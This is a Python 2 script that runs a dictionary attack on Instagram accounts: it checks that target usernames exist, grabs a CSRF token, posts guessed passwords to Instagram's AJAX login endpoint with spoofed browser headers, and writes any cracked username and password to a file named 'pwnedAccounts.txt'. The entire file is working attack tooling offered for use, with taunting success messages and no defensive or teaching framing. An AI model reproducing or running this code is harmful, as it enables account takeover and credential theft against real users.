#!/bin/python
from mainLib import *
import simplejson as json
import sys
import optparse


def userExists(username):
	try:
		response = br.open('https://instagram.com/'+username)
		response.read()
	except mechanize.HTTPError as e:
		if str(e) == 'HTTP Error 404: NOT FOUND':
			print 'user: "%s" does not exist, trying with the next!' %username
			return 1
	except:
		'uknown error'
		
def login(user, password):
        try:
			response = br.open('https://instagram.com/accounts/login')
			for cookie in cj:
				if (cookie.name == 'csrftoken'):
					csrftoken = cookie.value
					print 'Trying with password: ' + password
			br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'),('X-CSRFToken',csrftoken), ('Connection', 'keep-alive'),('Origin' ,'https://instagram.com'), ('X-Instagram-AJAX' , '1'),('Referer' ,'https://instagram.com/accounts/login/'), ('X-Requested-With', 'XMLHttpRequest')]
		
			response = br.open('https://instagram.com/accounts/login/ajax/', 'username='+user+'&password='+password)
			respuesta = response.read()
			json_dump = json.loads(respuesta)
			if json_dump['authenticated'] == True:
				print 'Access granted mother kaker!!' 
				print 'The password is: ' + password
				try:
					f = open('pwnedAccounts.txt','a')
				except:
					f = open('pwnedAccounts.txt','w')
				f.write('username:'+user+'\npassword:'+password+'\n')
				f.close()
				return 1

        except mechanize.HTTPError as e:
			print str(e.code)
        except mechanize.URLError as e:
			print str(e.reason.args)
        except:
			print "\r Check your connection to the internet mother kaker\r"

def dictionaryAttack(usernames,passwords):
	if str(type(usernames)) == "<type 'list'>":
		for username in usernames:
			if (userExists(username) == 1):
				continue
			print 'Trying with username: ' + username
			for password in passwords:
				if (login(username,password) == 1):
					cj.clear()
					break
	else:
		if (userExists(usernames) == 1):
			return
		print 'Trying with username: ' + usernames
		for password in passwords:
			if (login(usernames,password) == 1):
				break
def main():
	parser = optparse.OptionParser()
	parser.add_option('-f', '--file', action="store", dest="userfile", help="File containing valid usernames (one per line)", default=False)
	parser.add_option('-d', '--dictionary', action="store", dest="dictionary", help="File containing passwords", default=False)
	parser.add_option('-u', '--username', action="store", dest="username", help="A valid username", default=False)
	options, args = parser.parse_args()
	if ( (options.userfile == False) and (options.username == False) ) :
		print 'You have to set an username or a userfile'
		exit()
	if ( (options.userfile != False) and (options.username != False) ) :
		print 'You can\'t set both options at once.. choose between username or userfile'
		exit()
	if (options.dictionary == False):
		print 'You have to set a valid path for the passwords dictionary'
		exit()
	
	try:
		f = open(options.dictionary,'r')
		passwords = []
		
		while True:
			line = f.readline()
			if not line:
				break
			passwords.append(line.strip('\n'))
		f.close()
	except:
		print 'Check the path to the dictionary and try again'
		exit()
	
	if (options.userfile != False):
		try:
			f = open(options.userfile,'r')
			usernames = []
			
			while True:
				line = f.readline()
				if not line:
					break
				usernames.append(line.strip('\n'))
			f.close()
		except:
			print 'Check the path to the users file and try again'
			exit()	
		dictionaryAttack(usernames,passwords)
	else:
		dictionaryAttack(options.username,passwords)

main()
